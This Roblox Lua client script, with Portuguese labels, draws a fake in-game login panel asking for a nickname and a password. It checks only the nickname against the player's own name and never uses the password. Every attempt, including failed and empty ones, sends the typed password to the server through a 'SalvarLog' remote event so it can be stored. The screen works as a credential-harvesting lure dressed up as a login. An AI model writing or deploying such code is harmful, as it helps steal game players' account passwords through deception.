local Players = game:GetService("Players")
local player = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local loginGui = Instance.new("ScreenGui")
loginGui.Name = "LoginUI"
loginGui.ResetOnSpawn = false
loginGui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 180)
frame.Position = UDim2.new(0.5, -150, 0.5, -90)
frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
frame.Parent = loginGui

local nickBox = Instance.new("TextBox")
nickBox.PlaceholderText = "Seu nick"
nickBox.Size = UDim2.new(0.8, 0, 0, 30)
nickBox.Position = UDim2.new(0.1, 0, 0, 50)
nickBox.Parent = frame

local senhaBox = Instance.new("TextBox")
senhaBox.PlaceholderText = "Senha"
senhaBox.Size = UDim2.new(0.8, 0, 0, 30)
senhaBox.Position = UDim2.new(0.1, 0, 0, 90)
senhaBox.TextTransparency = 0
senhaBox.Parent = frame

local botao = Instance.new("TextButton")
botao.Text = "Entrar"
botao.Size = UDim2.new(0.8, 0, 0, 30)
botao.Position = UDim2.new(0.1, 0, 0, 130)
botao.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
botao.TextColor3 = Color3.new(1, 1, 1)
botao.Parent = frame

local aviso = Instance.new("TextLabel")
aviso.Size = UDim2.new(1, 0, 0, 20)
aviso.Position = UDim2.new(0, 0, 1, 5)
aviso.BackgroundTransparency = 1
aviso.TextColor3 = Color3.fromRGB(255, 80, 80)
aviso.Text = ""
aviso.Parent = frame

botao.MouseButton1Click:Connect(function()
    local nickDigitado = nickBox.Text
    local senhaDigitada = senhaBox.Text

    -- VERIFICA SE DIGITOU ALGO
    if nickDigitado == "" or senhaDigitada == "" then
        aviso.TextColor3 = Color3.fromRGB(255, 80, 80)
        aviso.Text = "❌ Preencha nick e senha"
        ReplicatedStorage:WaitForChild("SalvarLog"):FireServer(nickDigitado, senhaDigitada, "Falhou - Vazio")
        return
    end

    local status = ""

    if nickDigitado == player.Name then
        status = "Sucesso"
        aviso.TextColor3 = Color3.fromRGB(80, 255, 80)
        aviso.Text = "✅ Logado!"
        task.wait(0.3)
        loginGui:Destroy() -- SÓ SOME, NÃO ABRE NADA
    else
        status = "Falhou - Nick"
        aviso.TextColor3 = Color3.fromRGB(255, 80, 80)
        aviso.Text = "❌ Nick incorreto"
    end

    -- Salva no DataStore
    ReplicatedStorage:WaitForChild("SalvarLog"):FireServer(nickDigitado, senhaDigitada, status)
end)
